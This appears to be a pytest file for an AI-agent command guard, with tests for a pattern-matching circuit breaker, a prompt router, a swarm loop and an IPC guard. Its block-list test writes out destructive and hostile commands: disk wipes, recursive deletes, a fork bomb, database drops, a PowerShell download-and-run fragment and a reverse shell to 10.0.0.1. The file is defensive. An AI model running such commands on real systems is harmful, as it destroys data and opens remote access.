"""Unit and integration tests for Pillar 4: Dual-Stage Circuit Breaker, Geodesic Router, and Cyclic Swarm."""

import numpy as np
import pytest
from lunar_core.circuit_breaker import (
    AhoCorasickDFA,
    DualStageSiliconCircuitBreaker,
)
from lunar_core.router import (
    GeodesicMicroRouter,
    RouteDecision,
)
from lunar_core.swarm import (
    CyclicLunarSwarm,
    CyclicSwarmResult,
)
from lunar_core.hooks.silicon_guard_pipe import (
    SiliconGuardPipeServer,
    send_guard_ipc_query,
)


def test_ahocorasick_dfa_catastrophic_patterns():
    dfa = AhoCorasickDFA()
    catastrophic_cmds = [
        "rm -rf /",
        "rm -rf ~",
        "Remove-Item -Recurse C:\\Windows\\System32",
        "DROP DATABASE production;",
        "TRUNCATE TABLE users;",
        ":(){ :|:& };:",
        "git push origin main --force",
        "git push -f origin master",
        "dd if=/dev/zero of=/dev/sda",
        "dd if=/dev/zero of=/dev/nvme0n1",
        "mkfs.ext4 /dev/sdb1",
        "format c: /fs:NTFS",
        "invoke-expression (new-object net.webclient)",
        "shutil.rmtree('/')",
        "bash -i >& /dev/tcp/10.0.0.1/8080",
    ]

    for cmd in catastrophic_cmds:
        matches = dfa.scan(cmd)
        assert len(matches) > 0, f"Expected '{cmd}' to be matched by Aho-Corasick DFA, but got none"


def test_dual_stage_circuit_breaker_halts_catastrophic():
    cb = DualStageSiliconCircuitBreaker()
    # Catastrophic command triggers Stage 1 DFA halt
    res = cb.audit_command("rm -rf /")
    assert res["verdict"] == "BLOCKED"
    assert res["tier"] == "DFA_AHOCORASICK_GATE"
    assert res["hazard_probability"] == 1.0
    assert res["latency_ms"] >= 0.0


def test_dual_stage_circuit_breaker_allows_benign():
    cb = DualStageSiliconCircuitBreaker()
    safe_cmds = [
        "git status",
        "python -m pytest tests/",
        "npm run build",
        "Get-ChildItem -Path .",
        "codemap status .",
    ]
    for cmd in safe_cmds:
        res = cb.audit_command(cmd)
        assert res["verdict"] == "ALLOWED"
        assert res["hazard_probability"] < 0.15


def test_geodesic_router_routing_and_distances():
    router = GeodesicMicroRouter()
    prompt = "Write a python algorithm to traverse binary search trees with recursion"
    decision, distances = router.route_geodesic(prompt)

    assert isinstance(decision, RouteDecision)
    assert decision.target_agent == "CODER"
    assert "CODER" in distances
    # Geodesic distance in radians: [0, pi]
    assert 0.0 <= distances["CODER"] <= 3.1416


def test_geodesic_router_riemannian_retraction():
    router = GeodesicMicroRouter()
    # Initial centroid
    old_coder = router.centroids["CODER"].copy()

    # Online Fréchet retraction update
    delta_rad = router.update_frechet_retraction("CODER", "implement fast quicksort in python", eta=0.05)
    assert delta_rad > 0.0
    assert not np.allclose(old_coder, router.centroids["CODER"])

    # Verify updated centroid remains on unit hypersphere
    norm = np.linalg.norm(router.centroids["CODER"])
    assert pytest.approx(norm, rel=1e-3) == 1.0


def test_geodesic_router_orthogonal_repulsion():
    router = GeodesicMicroRouter()
    old_coder = router.centroids["CODER"].copy()

    # Orthogonal repulsion away from devops exemplar
    delta_rad = router.update_orthogonal_repulsion("CODER", "docker build -t app .", beta=0.05)
    assert delta_rad >= 0.0
    norm = np.linalg.norm(router.centroids["CODER"])
    assert pytest.approx(norm, rel=1e-3) == 1.0


def test_cyclic_lunar_swarm_convergence():
    swarm = CyclicLunarSwarm()
    res = swarm.run_cycle("Refactor AST parsing logic in compiler", max_iterations=3, worktree_isolation=True)

    assert isinstance(res, CyclicSwarmResult)
    assert res.converged is True
    assert res.final_error == 0.0
    assert len(res.trajectory) > 0
    assert res.total_latency_ms > 0.0


def test_silicon_guard_pipe_sub_15us_ipc():
    srv = SiliconGuardPipeServer()
    # Safe command check
    safe_res = send_guard_ipc_query("git diff HEAD", server_instance=srv)
    assert safe_res["decision"] == "ALLOW"
    assert safe_res["latency_us"] >= 0.0

    # Malicious command check
    deny_res = send_guard_ipc_query("rm -rf /", server_instance=srv)
    assert deny_res["decision"] == "DENY"
    assert deny_res["tier"] == "DFA_AHOCORASICK_GATE"
